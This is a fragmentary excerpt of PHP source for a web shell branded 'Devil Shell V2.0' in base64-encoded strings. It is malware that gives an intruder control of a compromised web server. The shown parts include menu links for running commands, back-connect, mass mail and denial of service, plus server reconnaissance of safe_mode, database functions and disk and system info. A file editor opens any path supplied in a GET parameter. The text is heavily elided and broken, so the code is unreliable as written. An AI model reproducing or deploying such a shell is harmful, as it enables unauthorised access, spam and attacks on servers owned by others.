...
?><?php echo base64_decode("RGV2aWwgU2hlbGw="); ?><?php echo base64_decode('VjIuMA=='); ?><?php echo base64_decode('PGltZyBzcmM9aHR0cDovL2kxMTc5LnBob3RvYnVja2V0LmNvbS9hbGJ1bXMveDM5MC9wYXVsbW9uY3kvdGVhbW51dHMvbG9nby5wbmcgYWx0PSJVbmRlcmdyb3VuZCBEZXZpbCIgaGVpZ2h0PTcwPg=='); ?><?php echo base64_decode("SU5ESUE="); ?><?php echo $self."?open="; ?><?php echo $self."?create=".$_SESSION['dir']?><?php echo $self."?bc"; ?><?php echo $self."?run"; ?><?php echo $self."?mail"; ?><?php echo $self."?dos"; ?><?php echo $self;?><?php echo $self;?><?php echo $self;?><?php echo $self;?><?php echo $self."?moreinfo"; ?><?php echo $self."?phpinfo"; ?><?php echo $self;?><?php echo $self;?><?php cip(); ?><?php yip(); ?><?php echo $pv; ?><?php echo $_SERVER['SERVER_PORT'];?><?php safe();?><?php echo disk(1);?><?php echo disk(2);?><?php echo php_uname(); ?><?php echo split_dir();?><?php echo $self;?><?php echo $self;?><?php echo $self;?><?php
...
{
	?><?php echo base64_decode('PGZvbnQgY29sb3I9I2ZmZmZmZj5OT1RFOiBBdXRvbWF0aWMgZGF0YWJhc2UgZmV0Y2ggZmVhdHVyZSBhbHNvIGF2YWlsYWJsZSBpbiBwYWlkIHZlcnNpb24='); ?><?php
	if(!empty($_POST['s1']))
	{
...
alert('hello');
	...
	{
	?><?php echo $_SERVER['SERVER_ADMIN']; ?><?php cip(); ?><?php cip(); ?><?php echo $_SERVER['SERVER_PORT'];?><?php echo @ini_get("safe_mode")?("<b>Enable(<font color=red>Secure</font>)"):("Disable(<font color=white>Insecure</font>)"); ?><?php echo @ini_get("open_basedir")?("<b>Enable(<font color=red>Secure</font>)"):("Disable(<font color=white>Insecure</font>)"); ?><?php yip(); ?><?php echo $pv; ?><?php echo function_exists('curl_version')?("<b>Enable"):("Disable"); ?><?php echo function_exists('ocilogon')?("<b>Enable"):("Disable"); ?><?php  echo function_exists('mysql_connect')?("<b>Enable"):("Disable");?><?php echo function_exists('mssql_connect')?("<b>Enable"):("Disable"); ?><?php echo function_exists('pg_connect')?("<b>Enable"):("Disable"); ?><?php dis(); ?><?php echo disk(1);?><?php echo disk(2);?><?php echo php_uname(); ?><?php echo $_SERVER['SERVER_SOFTWARE']; ?><?php
	}
...
?><?php echo $self;?><?php echo "'From Current Folder'"; ?><?php
for($k=1;$k<=7;$k++)	
echo "<option>".$k;
?><?php
for($k=1;$k<=7;$k++)	
...
?><?php echo $_GET['edit']; ?><?php echo $self; ?><?php
	$fedit=$_GET['edit'];
$frd=fopen($fedit,"r");
while(!feof($frd))
	{
